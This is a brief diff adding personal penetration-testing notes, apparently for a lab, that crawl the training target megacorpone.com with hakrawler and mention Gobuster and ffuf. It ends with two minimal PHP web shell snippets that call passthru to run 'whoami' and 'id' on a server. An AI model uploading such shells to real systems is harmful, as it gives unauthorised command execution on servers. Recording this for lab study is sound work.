@@ -1,0 +1,29 @@
+Hackcrawler: then bust with Gobuster ft ffuf
+
+# add our target in the text file and then pipe the file in hakrawler
+
+steps:
+
+echo "https://www.megacorpone.com/" > urls.txt
+cat urls.txt | ./hakrawler
+
+
+
+
+
+
+
+shell:
+
+<?php
+
+passthru("whoami");
+
+?>
+
+
+<?php
+
+passthru("id");
+
+?>
